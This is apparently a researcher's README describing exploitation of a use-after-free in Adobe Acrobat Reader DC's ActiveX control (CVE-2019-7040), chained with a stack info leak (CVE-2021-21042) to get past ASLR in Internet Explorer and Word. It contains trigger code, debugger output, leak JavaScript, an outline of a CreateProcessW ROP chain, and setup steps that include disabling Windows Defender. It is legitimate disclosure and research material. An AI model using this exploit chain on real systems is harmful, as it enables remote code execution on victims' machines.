# Microsoft Internet Explorer 11 (protected mode off) & Adobe Acrobat Reader DC ActiveX

A use-after-free vulnerability while processing the ActiveX function "postMessage" was identified in Adobe Acrobat Reader DC some years ago, [CVE-2019-7040](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7040) was issued for it. Here go **POCs and exploit code for Microsoft Internet Explorer & Microsoft Word (in DOCX & RTF formats)** which uses another vulnerability, [CVE-2021-21042](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21042), in order to bypass ASLR. 

## Description

Taking a look at the Type Library of ActiveX control named "Adobe PDF Reader" with ProgIds suches as "AcroPDF.PDF" or "AcroPDF.PDF.1" and CLSID "CA8A9780-280D-11CF-A24D-444553540000", we will observe the next:

```cpp
   void postMessage(object strArray);
   void execCommand(object strArray);
```

Functions **"postMessage" & "execCommand"** use as argument an **array element**. So it would be possible to define something like this (also possible to use "execCommand" instead of "postMessage"):

```js

var myobj = new ActiveXObject("AcroPDF.PDF");
myobj.src = "testcase.pdf";
var arr = ["foo", "bar"];
Object.defineProperty(arr, '0', {
    get: function() {
        myobj.LoadFile("test");
        return "foo";
    }
});

myobj.postMessage(arr);

```

No crash with page heap disabled. However, enabling page heap for process iexplore.exe, **next crash is got** (maybe needed to refresh the page in order to reproduce):

```
C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>gflags.exe /i iexplore.exe +ust +hpa
Current Registry Settings for iexplore.exe executable are: 02001000
    ust - Create user mode stack trace database
    hpa - Enable page heap
```

```
(fe0.21d0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroPDFImpl.dll - 
eax=0c4fc34c ebx=00000000 ecx=0dedefa8 edx=00000020 esi=65c93a48 edi=00000000
eip=65c57750 esp=0c4fc340 ebp=0c4fc350 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
AcroPDFImpl!DllUnregisterServer+0xb286:
65c57750 ff7140          push    dword ptr [ecx+40h]  ds:002b:0dedefe8=????????
0:009> !heap -p -a ecx
    address 0dedefa8 found in
    _DPH_HEAP_ROOT @ 7671000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    d87257c:          dede000             2000
    6af6ab02 verifier!AVrfDebugPageHeapFree+0x000000c2
    77cbfd06 ntdll!RtlDebugFreeHeap+0x0000003e
    77c23d56 ntdll!RtlpFreeHeap+0x000000d6
    77c67a5d ntdll!RtlpFreeHeapInternal+0x00000783
    77c23c26 ntdll!RtlFreeHeap+0x00000046
    76b33c9b ucrtbase!_free_base+0x0000001b
    76b33c68 ucrtbase!free+0x00000018
    65c6f4e0 AcroPDFImpl!DllUnregisterServer+0x00023016
    65c5819e AcroPDFImpl!DllUnregisterServer+0x0000bcd4
    65c3c1bc AcroPDFImpl+0x0000c1bc
    65c4d60e AcroPDFImpl!DllUnregisterServer+0x00001144
    775a8a6f OLEAUT32!DispCallFunc+0x0000016f
    7758acab OLEAUT32!CTypeInfo2::Invoke+0x000002eb
...

0:009> k
 # ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0c4fc350 65c581b3 AcroPDFImpl!DllUnregisterServer+0xb286
01 0c4fc360 65c3afbd AcroPDFImpl!DllUnregisterServer+0xbce9
02 0c4fc400 65c4df9b AcroPDFImpl+0xafbd
03 0c4fc444 775a8a6f AcroPDFImpl!DllUnregisterServer+0x1ad1
04 0c4fc46c 7758acab OLEAUT32!DispCallFunc+0x16f
05 0c4fc728 65c46f9a OLEAUT32!CTypeInfo2::Invoke+0x2eb
06 0c4fc750 65cf5744 AcroPDFImpl+0x16f9a
07 0c4fc7ac 68bc604a AcroPDF!DllUnregisterServer+0x6f4
08 0c4fc7ec 68b15b37 jscript9!HostDispatch::CallInvokeInternal+0x6a
09 0c4fc850 68bc5f99 jscript9!HostDispatch::CallInvokeHandler+0x61
0a 0c4fc8a4 68bc8015 jscript9!HostDispatch::CallInvoke+0x49
0b 0c4fc8c4 68bc7ed5 jscript9!HostDispatch::InvokeMarshaled+0x69
0c 0c4fc9b4 68bbd7ce jscript9!HostDispatch::InvokeByDispId+0x46b
...

```

Turning page heap off again and setting a breakpoint up on the crashing instruction, we are able to identify the **object size (0x58 bytes)**:

```
0:024> sxe ld:AcroPDFImpl.dll
0:024> g
...
ModLoad: 65c40000 65cbd000   C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroPDF.dll
ModLoad: 65b80000 65c3f000   C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroPDFImpl.dll
...
0:009> bp AcroPDFImpl!DllUnregisterServer+0xb286
0:009> g
...
Breakpoint 0 hit
eax=0597c6cc ebx=00000000 ecx=0d22c130 edx=00000020 esi=65be3a48 edi=00000000
eip=65ba7750 esp=0597c6c0 ebp=0597c6d0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
AcroPDFImpl!DllUnregisterServer+0xb286:
65ba7750 ff7140          push    dword ptr [ecx+40h]  ds:002b:0d22c170=0d1905c0
0:009> !heap -p -a ecx
    address 0d22c130 found in
    _HEAP @ 3070000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0d22c128 000c 0000  [00]   0d22c130    00058 - (free)
```

Taking this in account, it is possible to build a proof of concept.

## Proof of Concept

The proof of concept just triggers the bug and reallocates the object being freed. **As Adobe Acrobat Reader DC ActiveX was built without CFG (Control Flow Guard) flag**, the POC will give us **direct EIP control**. That easy.

For example, this is the windbg output for [./POCs/MSIE/poc.html](./POCs/MSIE/poc.html):

```
(71c.204c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Common Files\Adobe\Acrobat\ActiveX\AcroPDFImpl.dll - 
41414141 ??              ???
1:022:x86> r
eax=0573cabc ebx=00000000 ecx=02c89a00 edx=00000020 esi=680c3a48 edi=00000000
eip=41414141 esp=0573caa4 ebp=0573cac0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
41414141 ??              ???
1:022:x86> dc ecx
02c89a00  42424242 00410041 00410041 00410041  BBBBA.A.A.A.A.A.
02c89a10  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
02c89a20  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.
02c89a30  41414141 00420042 00420042 00420042  AAAAB.B.B.B.B.B.
02c89a40  43434343 00430043 00430043 00430043  CCCCC.C.C.C.C.C.
02c89a50  00430043 00000043 9a40836e 88000c00  C.C.C...n.@.....
02c89a60  00000002 00000001 00000000 00000001  ................
02c89a70  00000001 02c7bf70 75ced728 75ced728  ....p...(..u(..u
1:022:x86> dc esp
0573caa4  68087757 02c89a00 43434343 079a9990  Ww.h....CCCC....
0573cab4  00000002 0573cabc 00000000 0573cad0  ......s.......s.
0573cac4  680881b3 079a9990 00000002 0573cb70  ...h........p.s.
0573cad4  6806afbd 02c89a00 079a9990 00000002  ...h............
0573cae4  5952dbff 0573cb88 0573cbd0 6807df34  ..RY..s...s.4..h
0573caf4  00000003 07a68488 00000003 00000000  ................
0573cb04  00000002 00000000 079a9990 00000000  ................
0573cb14  00000000 07a5089c 00000000 02c89a00  ................

```

*There are POCs for Microsoft Internet Explorer & Microsoft Word (in DOCX & RTF formats). You will find a summary of files and dependencies in the end of this write-up.*


## Exploit code

In order to build an exploit, it is necessary to bypass ASLR somehow. To do that, [CVE-2021-21042](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21042) was used.

[CVE-2021-21042](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21042) was a **pretty nice bug** discovered by [Mark Vincent Yason](https://twitter.com/markyason) which leaks content of the stack, Mat Powell from [ZDI](https://www.zerodayinitiative.com) wrote a nice [write-up](https://www.zerodayinitiative.com/blog/2021/2/17/zdi-21-171-getting-information-disclosure-in-adobe-reader-through-the-id-tag) where he explained the bug. Since this bug was patched on Feb, 2021, it is somehow a perfect candidate for my exploit. However i found **some challenges** to overcome in order to use this.

#### Issue 1: Leaking something useful. 

The original discoverer leaked the base address for "Annots.api". That is not very useful over here, since my bug relies on the ActiveX control (I mean iexplore.exe), it is not possible reaching that library "Annots.api" from my bug.

**Solution.**

**Increasing (x4) the stack content being leaked**, we are able to reach out useful pointers saved in the stack located at the bottom suches as user32.dll, shell32.dll, and so on. This, added to both apps (AcroRd32.exe & IE rendering process) are based on **32-bit made the work easier**. Why? Because if we are able to leak base addr of user32.dll (32-bit version) in the process AcroRd32.exe, for sure our target process (IE rendering process) has also loaded this library in the same base address. This is the js function to leak a pointer into user32.dll added to a larger (x4) /ID tag content:

```js

function CVE202121042(){
        Collab.documentToStream(this);
        var docStream = Collab.documentToStream(this);
        var docString = SOAP.stringFromStream(docStream);

        // Go to the last /ID tag content
        var currentPosID = docString.search("/ID");
        while(currentPosID != -1){
            docString = docString.substring(currentPosID + 3, docString.length);
            currentPosID = docString.search("/ID");
        }
        // Find user32.dll return addr
        var addressString = 0;
        for(var i=2;i<docString.length;i+=8){
            var val = docString.substring(i+6, i+8) + docString.substring(i+4, i+6) + docString.substring(i+2, i+4) + docString.substring(i, i+2);
            if(parseInt(docString.substring(i+2, i+4) + docString.substring(i, i+2), 16) == 0x833f){
                addressString = parseInt(val, 16)-0x3833f;
                break;
            }
        }
        return addressString;
    }

``` 
This code is possible thanks to the proof of concept for [CVE-2021-21042](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21042) located at [this github repository](https://github.com/r1l4-i3pur1l4/CVE-2021-21042). By the way, return address for user32.dll chosen is found here:

![alt text](<./images/ret-addr-user32.dll-offset-chosen.png>) 

#### Issue 2: PDF file => HTML file. 

The info leak bug is exploited in the PDF file, so it is necessary to return the leaked addr into my javascript code in order to continue the exploitation.

**Solution.**

This was still easier to solve because last year i had found **an interesting old dev document** which explained how to use this ActiveX control in detail. This also helped me to find out another UAF in this component.
 
```cpp
object messageHandler { get; set; }
void OnMessage();
```

In javascript of PDF file (poc.pdf):

```js
this.hostContainer.postMessage(["Foo"]);
```

HTML file:

```html
<script>
    function onMessageHandler(message){
        // print in the console: "Message is: Foo"
        console.log("Message is: " + message);
    }
    function main(){
        var pdfobj = document.getElementById("pdfobj");
        if(typeof pdfobj.readyState === 'undefined'){
            pdfobj.messageHandler = { onMessage: onMessageHandler };  
            return;
        }
        if(pdfobj.readyState==4){
            pdfobj.messageHandler = { onMessage: onMessageHandler };
        }else{
            setTimeout(runExploit, 500);
        }
    }
</script>
<body onload="main();">
    <object id="pdfobj" classid="clsid:CA8A9780-280D-11CF-A24D-444553540000" height="0%" width="0%">
        <param name="src" value="poc.pdf"/>
    </object>
</body>
``` 

That is the code needed to establish a communication between PDF file and HTML file.

For the ROP chain and as the ActiveX component is not compiled with /CFG, a simple ROP chain that calls **"CreateProcessW" into user32.dll is the only requirement**. 

![alt text](<./images/createprocessw-user32-call.png>) 


In fact, it is still necessary a **sandbox escape** (or load the file locally, ie, local machine zone) but this is not included on this exploit so a first requirement to trigger this would be disabling protected mode on Microsoft Internet Explorer.

## How to reproduce

This exploit has been tested on:

+ **Windows 10 Version: 10.0.19044.1806 *(2022-06 Cumulative Update Preview (KB5014666) included)*.**
+ **Microsoft Word 2013 (but it should work across all the versions).**

Additionally it needs to install a **vulnerable copy of Adobe Acrobat Reader DC** which fortunately is provided by Adobe right [here](http://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1900820081/AcroRdrDC1900820081_en_US.exe).

As told above, **turn protected mode off** in Internet Explorer is the last requirement.

#### Recommendations

1) Once installed Adobe Acrobat, **disable Adobe Acrobat Update Service** (AdobeARMservice | armsvc.exe). That is because of this service will update the installation to the latest version as soon as possible.

2) **Turn Windows Defender off**. This exploit has not been tested under Windows Defender and as it uses common heap sprays techniques, will surely be detected. 

#### Microsoft Internet Explorer

+ Start a webserver in the path [./exploits/MSIE](./exploits/MSIE).
+ Open MSIE and navigate to http://webserver/exploit.html

![alt text](<./videos/msie.gif>)

#### Microsoft Word

+ Start a webserver (hardcoded, so 127.0.0.1:8081) in the path [./exploits/MSWord](./exploits/MSWord).
+ Double-click the file exploit.docx or exploit.rtf

![alt text](<./videos/word.gif>)

## Full listing of dependencies

+ Windows version: 10.0.19044.1806
+ Adobe Acrobat Reader DC version: 2019.008.20081.
+ Adobe Acrobat Reader DC ActiveX file version: 19.8.20071.41678
+ Adobe Acrobat Reader DC ActiveX product version: 19.8.20071.303822
+ user32.dll (SHA256 hash): 2630165443F3AF4A2024F1D91F9FB97B34587FF912BB2DF84E179240385DD213
+ AcroRd32.dll (SHA256 hash): FA8627F6E2D58AF00EFA9E0B2D49A2E2426CDBF16DA117951A17C8A2E8F970AA
+ AcroPDFImpl.dll (SHA256 hash): 6FB35628AF6395414B688184FA0E717FBAE16D3AE2FDCC5530553B05E25A7979

*Check out these dependencies if you are having any issue with the exploit. Above all, user32.dll because of those ROP gadgets.*

## Summary of files

#### Proofs of Concept

+ POC for Microsoft Internet Explorer: [./POCs/MSIE/poc.html](./POCs/MSIE/poc.html)
+ POC for Microsoft Word (DOCX format): [./POCs/MSWord/poc.docx](./POCs/MSWord/poc.docx)
+ POC for Microsoft Word (RTF format): [./POCs/MSWord/poc.rtf](./POCs/MSWord/poc.rtf)
+ Remote template for Microsoft Word: [./POCs/MSWord/poc.html](./POCs/MSWord/poc.html)

#### Exploits

+ Exploit for Microsoft Internet Explorer: [./exploits/MSIE/exploit.html](./exploits/MSIE/exploit.html) & [./exploits/MSIE/exploit.pdf](./exploits/MSIE/exploit.pdf)
+ Exploit for Microsoft Word (DOCX format): [./exploits/MSWord/exploit.docx](./exploits/MSWord/exploit.docx)
+ POC for Microsoft Word (RTF format): [./exploits/MSWord/exploit.rtf](./exploits/MSWord/exploit.rtf)
+ Remote template for Microsoft Word: [./exploits/MSWord/poc.html](./exploits/MSWord/poc.html)

## Final thoughts

+ I am going to **update the exploit** for a while (some Patch Tuesdays else), just needs to reconfigure user32.dll offsets in the ROP gadgets, so it is not as hard.
+ **Sandbox escape** also known as protected mode bypass, well that would be interesting. As this exploit uses Windows up-to-date, **just a sbx 0day may be helpful**, though. 
+ **Heap spray is the main issue of those few failures**, anyway leave this out could be nice in order to bypass AV detections.
+ To find out [CVE-2019-7040](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7040), i felt somehow inspired by my mate's [blog post](https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html). That was a nice reading by [Steven Seeley (mr_me)](https://twitter.com/steventseeley) in an important target like [Foxit](https://www.foxit.com/pdf-reader/). That should make you think around this, though: **Going to read as bug reports, write-ups or whatever as you can, take ideas and apply them in other targets**. Additionally: The targets are not as important, a great bug is always a great bug without taking the application importance in account, don't despise those interesting cases in abandoned or almost dead applications because **inspiration is somehow whimsical**.


:heart: :heart: :heart:  Enjoy it!!   :heart: :heart: :heart:


By [@j00sean](https://twitter.com/j00sean)
